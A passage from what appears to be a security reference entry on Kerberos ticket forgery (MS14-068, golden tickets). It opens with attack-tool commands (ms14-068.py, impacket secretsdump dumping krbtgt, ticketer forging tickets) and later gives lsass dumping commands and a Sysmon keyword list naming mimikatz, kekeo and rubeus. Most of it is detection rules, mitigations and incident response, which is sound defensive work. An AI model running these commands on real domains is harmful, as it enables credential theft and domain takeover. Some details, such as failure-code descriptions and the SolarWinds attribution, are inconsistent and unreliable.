# Requires Python 2.7 and dependencies: pycrypto, impacket
pip2 install pycrypto impacket
```

**Usage:**

```bash
python2 ms14-068.py -u user@DOMAIN.LOCAL -s S-1-5-21-... -d DC.DOMAIN.LOCAL
```

---

### Impacket

**Version:** 0.10.0+  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**

```bash
pip3 install impacket
# Or
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

**Usage:**

```bash
python3 -m impacket.secretsdump DOMAIN.LOCAL/user:password@DC.DOMAIN.LOCAL -just-dc-user krbtgt
python3 -m impacket.ticketer -domain CHILD.DOMAIN.LOCAL -domain-sid S-1-5-21-... -user Administrator -nthash HASH -extra-sid S-1-5-21-...-519 output.ccache
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Forged Kerberos TGT with Mismatched Security ID

**Rule Configuration:**
- **Required Index:** `wineventlog` (or Windows Security event logs forwarded to Splunk)
- **Required Sourcetype:** `XmlWinEventLog:Security` or `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Security_ID`, `Account_Name`, `ServiceName`
- **Alert Threshold:** 1 event (immediate alert on first occurrence)
- **Applies To Versions:** All (Server 2008 R2+)

**SPL Query:**

```spl
index=wineventlog source="WinEventLog:Security" EventCode=4768
| where Security_ID != Account_Name
| stats count by host, Account_Name, Security_ID, TargetUserName, Service
| where count > 0
```

**What This Detects:**
- **Line 1:** Filters for Event 4768 (TGT request/failure) in Windows Security logs.
- **Line 2:** Identifies mismatches between the Security ID (SID) and Account Name—a hallmark of forged TGTs where the attacker impersonates an account with an incorrect SID.
- **Line 3-4:** Aggregates results and flags suspicious patterns.

**Manual Configuration Steps (Splunk):**

1. Navigate to **Splunk Home** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **+ New Alert**
4. In the search bar, paste the SPL query above
5. Set **Run every:** 5 minutes
6. Set **Trigger Condition** to "Alert when count > 0"
7. Configure **Action** → **Email** or **Webhook** to notify security team

**False Positive Analysis:**
- **Legitimate Activity:** None; this is a high-fidelity indicator of exploitation.
- **Tuning:** May need to exclude service accounts or special administrative accounts if they legitimately generate such patterns (very rare).

**Source:** [Microsoft Event 4768 Reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768), [AD Security Blog](https://adsecurity.org/)

---

### Rule 2: Event 4769 TGS Request Failure with Failure Code 0xf (Forged Ticket Detection)

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `FailureCode`, `Service`
- **Alert Threshold:** 2+ occurrences in 10 minutes
- **Applies To Versions:** Server 2008 R2+

**SPL Query:**

```spl
index=wineventlog source="WinEventLog:Security" EventCode=4769 FailureCode="0xF"
| timechart count by host
| where count > 1
```

**What This Detects:**
- Failure code 0xF (KRB_AP_ERR_MODIFIED) indicates the KDC detected a modified PAC in the ticket—a **direct indicator of CVE-2014-6324 exploitation on patched systems**.
- Multiple 4769 failures in rapid succession = systematic ticket forging attempts.

**Manual Configuration Steps:**

1. **Navigate to Splunk → Search & Reporting**
2. **Create a scheduled search:**
   - Name: "Kerberos Forged Ticket Detection (Code 0xF)"
   - Query: (paste SPL above)
   - Schedule: Run every 5 minutes
   - Alert on: count > 1
3. **Action:**
   - Email to SOC
   - Webhook to SIEM/SOAR platform
   - Create incident in ServiceNow/Jira

**False Positive Analysis:**
- **Cause:** Failure code 0xF can occur due to clock skew, but is **very rare** in modern environments.
- **Tuning:** If FP occurs, check event details for timestamps that are vastly different between client and DC (> 5 minutes).

**Source:** [Microsoft Event 4769 Reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Golden Ticket Usage (4672 + 4769 Correlation)

**Rule Configuration:**
- **Required Table:** `SecurityEvent` (from Windows Security logs ingested into Sentinel)
- **Required Fields:** `EventID`, `Account`, `Computer`, `TargetLogonId`, `PrivilegesList`
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All (Server 2008 R2+)

**KQL Query:**

```kusto
let suspicious_privileges = SecurityEvent
    | where EventID == 4672
    | where PrivilegeList contains "SeDebugPrivilege" or PrivilegeList contains "SeTcbPrivilege"
    | project TargetLogonId, Computer, TimeGenerated, Account;

SecurityEvent
| where EventID == 4769
| where Status == "0x0"  // Successful TGS request
| join kind=inner (suspicious_privileges) on TargetLogonId, Computer
| project TimeGenerated, Account, Computer, EventID, TargetLogonId
| summarize count() by Account, Computer, bin(TimeGenerated, 5m)
| where count_ > 3
```

**What This Detects:**
- **Line 1-5:** Identifies processes or sessions requesting `SeDebugPrivilege` or `SeTcbPrivilege` (Event 4672)—indicator of privilege escalation.
- **Line 7-10:** Correlates with successful TGS requests (4769) from the same logon session within a 5-minute window.
- **Line 11:** Flags patterns where multiple TGS requests occur after privilege escalation.

**Manual Configuration Steps (Azure Portal):**

1. **Navigate to:** Azure Portal → **Microsoft Sentinel** → Select Workspace
2. **Click:** Analytics → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Golden Ticket Detection - Privilege Escalation Pattern`
   - Severity: `High`
   - MITRE ATT&CK: `T1558.001`
4. **Set rule logic Tab:**
   - **Paste KQL query** above
   - **Run query every:** `5 minutes`
   - **Lookup data from the last:** `1 hour`
5. **Incident settings Tab:**
   - ✓ Enable **Create incidents from alerts triggered by this analytics rule**
   - **Incident grouping:** Group all alerts into a single incident
6. **Review + create** → **Create**

**Manual Configuration Steps (PowerShell - Automation):**

```powershell
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$rule = @{
    DisplayName = "Golden Ticket Detection - Privilege Escalation"
    Description = "Detects golden ticket usage via 4672+4769 correlation"
    Severity = "High"
    Enabled = $true
    SourceType = "Scheduled"
    QueryFrequency = "PT5M"
    QueryPeriod = "PT1H"
    Tactic = @("CredentialAccess", "LateralMovement")
}

$query = @'
let suspicious_privileges = SecurityEvent
    | where EventID == 4672
    | where PrivilegeList contains "SeDebugPrivilege" or PrivilegeList contains "SeTcbPrivilege"
    | project TargetLogonId, Computer, TimeGenerated, Account;

SecurityEvent
| where EventID == 4769
| where Status == "0x0"
| join kind=inner (suspicious_privileges) on TargetLogonId, Computer
| project TimeGenerated, Account, Computer, EventID, TargetLogonId
| summarize count() by Account, Computer, bin(TimeGenerated, 5m)
| where count_ > 3
'@

# Create the rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
    -WorkspaceName $WorkspaceName `
    -DisplayName $rule.DisplayName `
    -Query $query `
    -QueryFrequency "PT5M" `
    -QueryPeriod "PT1H" `
    -Severity $rule.Severity `
    -Enabled $true
```

**Source:** [Microsoft Sentinel GitHub - Kerberos Rules](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/KerberosTicketForgerySuspiciousAccount.yaml)

---

### Query 2: Detect PAC Validation Failures (CVE-2014-6324 Specific)

**Rule Configuration:**
- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `Status`, `FailureCode`, `ProcessName`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (immediately on event)
- **Applies To Versions:** Server 2008 R2 - 2012 R2

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4769
| where FailureCode == "0xF"  // KRB_AP_ERR_MODIFIED (PAC validation failure)
| project TimeGenerated, Computer, Account, TargetUserName, FailureCode, Status
| summarize count() by Computer, Account, bin(TimeGenerated, 1m)
| where count_ >= 1
```

**What This Detects:**
- Failure code **0xF** is the specific signature of PAC validation failure—a direct indicator of CVE-2014-6324 exploitation attempts on patched systems.
- Even a **single occurrence** is suspicious and warrants immediate investigation.

**Manual Configuration (Azure Portal):**

1. **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `CVE-2014-6324 PAC Validation Failure Detection`
3. **Severity:** `Critical`
4. **Paste KQL:** (from above)
5. **Frequency:** `1 minute`
6. **Alert Threshold:** `count_ >= 1`
7. **Create**

---

## 10. WINDOWS EVENT LOG MONITORING

### Event 4768 - Kerberos Authentication Ticket (TGT) Request/Failure

- **Log Source:** Security (on Domain Controller)
- **Trigger:** Issued when AS-REQ (Kerberos TGT request) succeeds or fails
- **Filter for Exploitation:** Look for entries where Security ID ≠ Account Name (forged PAC), unusual UPN formats, or requests from non-domain-joined systems
- **Applies To Versions:** Server 2008 R2+

**Manual Configuration Steps (Group Policy):**

1. **Open Group Policy Management Console** (`gpmc.msc`)
2. **Navigate to:** Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon
3. **Enable:** Audit Kerberos Authentication Service
   - Success: ✓
   - Failure: ✓
4. **Run:** `gpupdate /force` on all DCs

**Manual Configuration Steps (Local Policy - Server 2016+):**

1. **Open:** Local Security Policy (`secpol.msc`)
2. **Navigate to:** Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon
3. **Double-click:** Audit Kerberos Authentication Service
4. **Check:** Success and Failure
5. **Apply**

---

### Event 4769 - Kerberos Service Ticket (TGS) Request/Failure

- **Log Source:** Security (on Domain Controller)
- **Trigger:** Issued when user requests a service ticket (TGS) after successful TGT
- **Filter for Exploitation:** Look for failure code 0xF (KRB_AP_ERR_MODIFIED), unusual SPNs, rapid successive requests from the same source
- **Applies To Versions:** Server 2008 R2+

**Manual Configuration Steps (Group Policy):**

1. **Open:** Group Policy Management Console (`gpmc.msc`)
2. **Navigate to:** Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon
3. **Enable:** Audit Kerberos Service Ticket Operations
   - Success: ✓ (for golden ticket usage detection)
   - Failure: ✓ (for 0xF failure code detection)
4. **Run:** `gpupdate /force`

**Note:** Event 4769 is HIGH-VOLUME in production environments. Recommend filtering to:
- Failures only (`Status != 0x0`)
- Specific SPNs or services of interest
- Time-based collection (off-hours, suspicious times)

---

### Event 4672 - Special Privileges Assigned to New Logon

- **Log Source:** Security (on any computer)
- **Trigger:** Issued when a logon session is granted sensitive privileges (SeDebugPrivilege, SeTcbPrivilege, SeAssignPrimaryTokenPrivilege)
- **Filter for Exploitation:** Baseline normal administrative logons; alert on unexpected users/systems requesting these privileges
- **Applies To Versions:** All

**Manual Configuration Steps:**

1. **Group Policy:** Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Privilege Use
2. **Enable:** Audit Sensitive Privilege Use
   - Success: ✓
   - Failure: ✓
3. **Apply & `gpupdate /force`**

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows

**Sysmon Configuration (XML - Filter for Golden Ticket Indicators):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Monitor for Mimikatz or Kekeo processes requesting Kerberos-related APIs -->
    <RuleGroup name="Process Creation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains any">mimikatz;kekeo;rubeus;pykek;ticketer;asktgt;kerberos::golden</CommandLine>
      </ProcessCreate>
    </RuleGroup>

    <!-- Monitor for suspicious network activity on port 88 (Kerberos) from non-SYSTEM processes -->
    <RuleGroup name="Network Connection" groupRelation="or">
      <NetworkConnect onmatch="include">
        <DestinationPort>88</DestinationPort>
        <Image condition="excludes">lsass.exe;svchost.exe</Image>
      </NetworkConnect>
    </RuleGroup>

    <!-- Monitor for LSASS process manipulation (Mimikatz approach) -->
    <RuleGroup name="File Create" groupRelation="or">
      <FileCreate onmatch="include">
        <TargetFilename condition="contains">.kirbi</TargetFilename>
      </FileCreate>
    </RuleGroup>

    <!-- Monitor for suspicious DLL loading in LSASS (credential extraction) -->
    <RuleGroup name="Image Load" groupRelation="or">
      <ImageLoad onmatch="include">
        <Image condition="image">lsass.exe</Image>
        <ImageLoaded condition="contains any">samlib.dll;cryptdll.dll;ntdsai.dll</ImageLoaded>
      </ImageLoad>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. **Download Sysmon:** [Microsoft Sysinternals Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. **Create config file** `sysmon-config.xml` with the XML above
3. **Install Sysmon with config:**
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. **Verify installation:**
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```
5. **Collect logs:**
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Export-Csv -Path "C:\Logs\sysmon_events.csv"
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: "Suspicious Kerberos Ticket Request"

- **Severity:** High
- **Description:** Defender for Cloud detects anomalous patterns in Kerberos authentication, including:
  - TGT requests from unusual source IPs or times
  - Multiple failed TGS requests followed by successful access
  - Requests for admin-level services from non-admin accounts
- **Applies To:** Azure subscription with Defender enabled

**Manual Configuration Steps (Enable Defender for Cloud):**

1. **Navigate to Azure Portal** → **Microsoft Defender for Cloud**
2. **Go to:** Environment settings → Select your subscription
3. **Under "Defender plans":**
   - **Defender for Servers:** Toggle to **ON**
   - **Defender for Identity:** Toggle to **ON**
   - **Defender for Storage:** Toggle to **ON** (optional, for lateral movement detection)
4. **Click:** Save

**Manual Configuration Steps (Review Alerts):**

1. **In Defender for Cloud:** Left menu → **Security alerts**
2. **Filter by:** Severity = High, Threat type = Kerberos
3. **Click on alert** to view details:
   - Affected resources
   - Timeline of activity
   - Recommended remediation (isolate host, reset credentials)

**Remediation:**
- Isolate affected machine from network
- Reset KRBTGT password twice (to invalidate both old and new hashes)
- Force password resets for all domain admin accounts
- Check for lateral movement to other systems

**Reference:** [Microsoft Defender for Cloud - Kerberos Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference#kerberos-based-threats)

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Detect KRBTGT Account Activity

**Applicable To:** Microsoft 365 environments with Azure AD (Entra ID) integration

```powershell
Connect-ExchangeOnline
Connect-AzureAD

# Search for unusual KRBTGT-related activities
Search-UnifiedAuditLog -Operations "UserLoggedIn" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -ResultSize 5000 -UserIds krbtgt* | Export-Csv -Path "C:\Audit\krbtgt_activity.csv"

# Alternative: Search for privilege elevation events
Search-UnifiedAuditLog -Operations "Modify user privilege" -StartDate (Get-Date).AddDays(-7) -FreeText "krbtgt" | Export-Csv -Path "C:\Audit\krbtgt_privilege_changes.csv"
```

**Manual Configuration Steps (Enable Unified Audit Log):**

1. **Navigate to:** Microsoft Purview Compliance Portal (compliance.microsoft.com)
2. **Go to:** Audit (left sidebar)
3. **If not enabled:**
   - Click **Turn on auditing**
   - Wait 24-48 hours for log retention to activate
4. **Once enabled:**
   - Click **Audit search**
   - Set **Date range** (e.g., Last 7 days)
   - Under **Activities**, select: User admin activity, User group change, Role assignment change
   - Under **Users**, enter: krbtgt or * (all users)
   - Click **Search**

**Export Results:**

```powershell
# Export all results to CSV
$results = Search-UnifiedAuditLog -Operations "UserLoggedIn" -StartDate (Get-Date).AddDays(-7) -ResultSize 5000
$results | Select-Object CreationDate, UserIds, ObjectId, Operation, AuditData | Export-Csv -Path "C:\Audit\purview_export.csv" -NoTypeInformation
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Immediately Patch Domain Controllers**

**Applies To Versions:** All unpatched systems

**Manual Steps (Server 2008 R2 - 2012 R2):**

1. **Download:** Windows Update KB3011780 (MS14-068)
   - [Microsoft Download Center](https://www.microsoft.com/en-us/download/details.aspx?id=44808)
2. **Install on each DC:**
   ```cmd
   wusa.exe KB3011780.msu /quiet /norestart
   ```
3. **Reboot all DCs in sequence** (one at a time to maintain availability)
4. **Verify patch:**
   ```powershell
   Get-HotFix -Id "KB3011780"
   ```

**Manual Steps (Server 2016+):**

1. **Enable Windows Update** or deploy via WSUS
2. **Monthly Cumulative Updates** include Kerberos security patches
3. **Verify:**
   ```powershell
   Get-WindowsUpdateLog | Select-String "KB" | Select-Object -Last 10
   ```

**PowerShell (Group Policy):**

```powershell
# Deploy patch via Group Policy
# Requires WSUS or SCCM integration
```

---

**Action 2: Reset KRBTGT Account Password Twice**

**Applies To Versions:** All (regardless of patch status; critical post-compromise)

**Manual Steps:**

1. **First Password Reset** (from Primary DC):
   ```powershell
   # On Domain Controller
   Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force) -Verbose
   ```
2. **Wait 10-15 minutes** (allow replication to all DCs)
3. **Second Password Reset:**
   ```powershell
   Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force) -Verbose
   ```
4. **Force replication:**
   ```powershell
   Sync-ADObject -Identity (Get-ADUser krbtgt).DistinguishedName -Source (Get-ADDomainController -Discover -Service PrimaryDC).HostName
   ```

**Why Two Resets?**
- Kerberos caches both old and new KRBTGT hashes temporarily.
- First reset invalidates all TGTs signed with the original key.
- Second reset (after replication) ensures all DCs have the new hash.

---

**Action 3: Enable Comprehensive Kerberos Auditing**

**Applies To Versions:** All

**Manual Steps (Group Policy - All DCs):**

1. **Open Group Policy Management Console** (`gpmc.msc`)
2. **Create or edit:** Domain Policy → Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration
3. **Enable ALL of:**
   - **Audit Kerberos Authentication Service** (Success + Failure)
   - **Audit Kerberos Service Ticket Operations** (Success + Failure)
   - **Audit Account Logon Events** (Success + Failure)
   - **Audit Sensitive Privilege Use** (Success + Failure)
4. **Apply:** `gpupdate /force` on all DCs
5. **Verify:** Event log shows 4768, 4769, 4672, 4704 events

**PowerShell:**

```powershell
# Enable auditing via auditpol
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

---

### Priority 2: HIGH

**Action: Implement SID Filtering for Domain Trusts**

**Applies To Versions:** All (especially cross-forest trusts)

**Manual Steps (Group Policy - Domain with External Trusts):**

1. **Open Group Policy Management Console** (`gpmc.msc`)
2. **Create policy:** Domain Trusts Security Policy
3. **Navigate to:** Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options
4. **Find:** "Network security: Restrict NTLM: Incoming NTLM traffic"
5. **Set to:** "Deny all domain accounts"
6. **Also enable:** "Network security: Restrict NTLM: NTLM authentication in this domain"
   - Set to: "Deny for domain accounts to domain servers" or "Deny all"

**PowerShell (Per Trust):**

```powershell
# View trust SID filtering status
Get-ADTrust -Filter * | Select-Object Name, SIDFilteringForestAware, SIDFilteringQuarantinedDomain

# Enable SID filtering for external trust
Set-ADTrust -Identity "EXTERNAL.DOMAIN" -TrustAttributes "SIDFilteringForestAware" -Verbose
```

---

**Action: Implement Conditional Access Policies**

**Applies To Versions:** Entra ID (Azure AD) environments

**Manual Steps (Azure Portal):**

1. **Navigate to:** Azure Portal → Entra ID → Security → Conditional Access
2. **Click:** + New policy
3. **Name:** "Block Legacy Kerberos + Enforce MFA"
4. **Assignments:**
   - Users: All users
   - Cloud apps: All cloud apps
5. **Conditions:**
   - Client apps: Legacy authentication clients
6. **Access Controls:**
   - Grant: Block access
7. **Enable policy:** ON
8. **Create**

**Additional Policy - Require Compliant Device:**

1. **+ New policy**
2. **Name:** "Admin Access - Compliant Device Required"
3. **Assignments:**
   - Users: Global Admins
   - Cloud apps: Microsoft Azure Management, Microsoft Graph
4. **Access Controls:**
   - Grant: Require device to be marked as compliant
5. **Enable:** ON

---

### Access Control & Policy Hardening

**Action: Restrict Kerberos Delegation**

**Manual Steps:**

1. **Identify all user/computer accounts with delegation enabled:**
   ```powershell
   Get-ADUser -Filter { TrustedForDelegation -eq $true } | Select-Object Name, UserPrincipalName
   Get-ADComputer -Filter { TrustedForDelegation -eq $true } | Select-Object Name, DNSHostName
   ```

2. **Remove delegation for non-trusted accounts:**
   ```powershell
   Set-ADUser -Identity "ServiceAccount" -TrustedForDelegation $false -Verbose
   Set-ADComputer -Identity "WebServer" -TrustedForDelegation $false -Verbose
   ```

3. **If delegation is required, use Constrained Delegation instead:**
   ```powershell
   Set-ADUser -Identity "ServiceAccount" -TrustedForDelegation $false -Verbose
   # Then configure S4U via Active Directory Users & Computers GUI
   # Or: Set-ADServiceAccount -Identity "ServiceAccount" -TrustedForDelegation $false
   ```

---

**Action: Enable Smart Card Requirement for Sensitive Accounts**

**Manual Steps:**

1. **Identify sensitive accounts:**
   ```powershell
   Get-ADGroupMember "Domain Admins", "Enterprise Admins" | Select-Object Name, ObjectClass
   ```

2. **Enable smart card requirement:**
   ```powershell
   Set-ADUser -Identity "Administrator" -SmartcardLogonRequired $true -Verbose
   Get-ADUser -Filter { MemberOf -RecursiveMatch "CN=Domain Admins,CN=Users,DC=domain,DC=local" } | Set-ADUser -SmartcardLogonRequired $true
   ```

3. **Deploy smart cards** to sensitive staff (physical or virtual certificates)

---

### Validation Command (Verify Mitigations Are Active)

```powershell
# Check patch status
Get-HotFix -Id "KB3011780" -ErrorAction SilentlyContinue | Select-Object PSComputerName, HotFixID, InstalledDate

# Verify KRBTGT password age (should be recent if reset)
Get-ADUser -Identity krbtgt -Properties PasswordLastSet | Select-Object Name, PasswordLastSet

# Check audit policies
auditpol /get /category:* | Select-String "Kerberos"

# Verify delegation is disabled on sensitive accounts
Get-ADUser -Filter { TrustedForDelegation -eq $true } | Measure-Object  # Should be minimal or 0

# Check SID filtering on trusts
Get-ADTrust -Filter * | Select-Object Name, TrustAttributes
```

**Expected Output (If Secure):**
- KB3011780 is installed (or OS is Server 2016+)
- KRBTGT PasswordLastSet is within last 6 months
- Audit policies show "Success and Failure" for Kerberos categories
- Minimal accounts with delegation enabled (0 is ideal)
- All external trusts have SID filtering enabled

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `admin.kirbi`, `golden.kirbi`, `trust.kirbi`, `*.kirbi` (Kerberos ticket files)
- `C:\Temp\*`, `C:\Users\<user>\AppData\Local\Temp\` (temporary ticket storage)
- Mimikatz binaries: `mimikatz.exe`, `mimikatz_trunk.exe`
- Kekeo binaries: `kekeo.exe`
- Rubeus binaries: `Rubeus.exe`
- PyKEK scripts: `ms14-068.py`, `*.ccache` (Kerberos ticket cache files on Linux)

**Registry:**
- `HKCU\Software\Microsoft\Kerberos\` (Kerberos cache settings—unusual entries)
- `HKCU\Environment\KRB5CCNAME` (explicit Kerberos cache file path)
- Recent execution of cmd.exe / PowerShell with Mimikatz/Kekeo syntax

**Network:**
- Source: Any non-SYSTEM process sending raw Kerberos traffic (port 88/TCP-UDP)
- Destination: Domain controller(s) port 88
- Pattern: Repeated AS-REQ and TGS-REQ sequences from same non-lsass.exe process
- Timeframes: Off-hours, unusual times of day

**Event Log:**
- Event 4768 with mismatched Security ID and Account Name
- Event 4769 with failure code 0xF (Failure: Preauthentication failed)
- Event 4672 (Special privileges assigned) from non-admin accounts
- Event 4688 (Process Creation) for Mimikatz / Kekeo / Rubeus execution

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Windows Security event log)
- `C:\Windows\System32\config\SAM` (if KRBTGT hash extracted)
- `C:\Windows\NTDS\NTDS.dit` (if domain database dumped)
- Temporary files in `C:\Temp`, `%USERPROFILE%\AppData\Local\Temp\`
- MFT / USN Journal entries for `.kirbi` file creation

**Memory:**
- lsass.exe process memory (if credential extraction occurred)
- Presence of Mimikatz code patterns in process memory
- Tickets in Kerberos cache (examine with `klist` or Mimikatz `kerberos::list`)

**Cloud (Entra ID / M365):**
- AuditData in UnifiedAuditLog (Microsoft Purview)
- SigninLogs showing admin logins from suspicious IPs/locations
- EventID 4768 / 4769 in Azure AD audit logs (if AD Connect is enabled)

---

### Response Procedures

**1. Isolate (Immediately)**

**Command (Local):**
```powershell
# Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or: Shut down networking via Group Policy
netsh interface set interface name="Ethernet" admin=disabled
```

**Command (Azure VM):**

1. Navigate to **Azure Portal** → **Virtual Machines** → Select affected VM
2. **Networking** → **Network Interface** → **DNS settings**
3. Set to non-functional DNS (e.g., 1.1.1.1 with firewall rules to block)
4. Or: Detach the NIC entirely

**Manual (Safest - Physical Isolation):**
- Disconnect network cable from affected machine
- Power off the machine if compromise is confirmed

---

**2. Collect Evidence (Preserve Forensics)**

**Command (Collect Security Event Log):**
```powershell
# Export Security event log
wevtutil epl Security "C:\Evidence\Security.evtx"
wevtutil epl System "C:\Evidence\System.evtx"

# Or use PowerShell
Get-WinEvent -LogName Security -MaxEvents 10000 | Export-Csv -Path "C:\Evidence\SecurityEvents.csv"
```

**Command (Collect Kerberos Cache):**
```powershell
# Export Kerberos tickets
klist export
# Tickets are exported to current directory as .kirbi files

# Or via Rubeus
Rubeus.exe dump /luid:0x3e7 /nowrap > "C:\Evidence\KerberosDump.txt"
```

**Command (Memory Dump of lsass.exe):**
```powershell
# Using procdump (SysInternals)
procdump64.exe -ma lsass.exe "C:\Evidence\lsass.dmp"

# Using comsvcs.dll method (no special tools needed)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Evidence\lsass.dmp full
```

**Command (Collect DCSync Artifacts):**
```powershell
# Check for DCSync operations in event logs
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4662} | 
    Where-Object { $_.Message -match "Directory Replication" } |
    Export-Csv "C:\Evidence\DCSync.csv"
```

---

**3. Remediate (Stop the Bleeding)**

**Command (Reset KRBTGT Password):**
```powershell
# First reset
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force) -Verbose

# Wait 10-15 minutes for replication

# Second reset
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force) -Verbose
```

**Command (Force Logout of Forged Ticket Sessions):**
```powershell
# Reset all user passwords suspected of compromise
Get-ADUser -Filter { Modified -gt (Get-Date).AddHours(-1) } | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).Guid -Force) -ChangePasswordAtLogon $true -Verbose
```

**Manual (Domain-Wide Password Reset):**
1. **Use Group Policy** to force password change on next logon for all users:
   - Open GPMC → Default Domain Policy
   - Computer Config → Policies → Windows Settings → Security Settings → Account Policies → Password Policy
   - Set "Maximum password age" to 1 day
   - `gpupdate /force` on all machines
   - All users must change password on next logon

---

**4. Eradication (Remove Attacker Access)**

**Command (Hunt for Suspicious Tickets):**
```powershell
# Search for .kirbi files
Get-ChildItem -Path "C:\", "C:\Temp\", "C:\Windows\Temp" -Recurse -Filter "*.kirbi" -ErrorAction SilentlyContinue

# Search for Kerberos cache files
Get-ChildItem -Path "$env:APPDATA", "$env:USERPROFILE\AppData" -Recurse -Filter "*ccache*" -ErrorAction SilentlyContinue
```

**Command (Remove Malicious Accounts):**
```powershell
# Remove any suspicious service accounts or backdoor accounts created
Get-ADUser -Filter { Created -gt (Get-Date).AddHours(-24) } | Select-Object Name, Created
# Review and delete suspicious accounts
Remove-ADUser -Identity "SuspiciousAccount" -Confirm:$false
```

---

**5. Recovery (Restore Trust)**

- **Short-term:** Monitor 24/7 for 30 days post-incident
- **Medium-term:** Monitor 24/5 for 90 days
- **Long-term:** Implement continuous Kerberos monitoring (long-term)
- **If persistent compromise suspected:** **Complete forest rebuild is the only guaranteed remediation**

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [AD-ENUM-001] LDAP Enumeration / Phishing | Attacker gains foothold and initial domain user credentials |
| **2** | **Privilege Escalation** | [CA-KERB-001] Kerberoasting or [CA-KERB-005] AS-REP Roasting | Attacker obtains service account or user password via Kerberos cracking |
| **3** | **Persistence** | [CA-KERB-008] DCSync (Credential Access) | Attacker obtains replication rights and dumps krbtgt hash via DCSync |
| **4** | **Current Technique** | **[CA-KERB-013] Krbtgt Cross-Forest Reuse** | **Attacker forges golden ticket and escalates to domain/enterprise admin** |
| **5** | **Lateral Movement** | [CA-KERB-010] Silver Ticket / [CA-KERB-014] UnPAC-The-Hash | Attacker forges service tickets to access sensitive systems (MSSQL, SMB, etc.) |
| **6** | **Persistence** | [CA-KRBTGT-004] KRBTGT Account Manipulation or [AD-PERSIST-001] Golden Ticket Caching | Attacker maintains long-term persistence via forged tickets |
| **7** | **Impact** | [AD-EXFIL-001] Sensitive Data Exfiltration / [AD-RANSOM-001] Domain-Wide Encryption | Attacker achieves objectives: data theft, encryption, disruption |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - SolarWinds Supply Chain Attack (2020)

- **Target:** U.S. Government agencies, Fortune 500 companies
- **Timeline:** March - December 2020 (detected)
- **Technique Usage:** APT29 leveraged compromised domain controllers to forge golden tickets after gaining admin access. They used Kerberos ticket forgery to maintain persistence across domain boundaries.
- **Impact:** Multi-month dwell time, exfiltration of classified information, lateral movement across agencies
- **Reference:** [CISA Alert AA20-352A: APT29 Activity](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-alert-aa20-352a-advanced-persistent-threat-29-activity)

---

### Example 2: Lazarus Group - Sony Pictures Entertainment Hack (2014)

- **Target:** Sony Pictures Entertainment
- **Timeline:** November-December 2014
